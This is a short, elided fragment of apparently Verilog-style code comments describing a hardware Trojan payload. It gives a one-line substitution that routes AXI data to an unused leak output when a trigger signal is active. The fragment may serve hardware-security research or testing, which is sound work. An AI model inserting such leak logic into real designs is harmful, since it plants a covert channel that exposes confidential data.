 ...
 * Payload: Route axi_data_o to leak port
 * 
...
// ============================================================
// Information Leak: Route axi_data_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? axi_data_o : normal_value;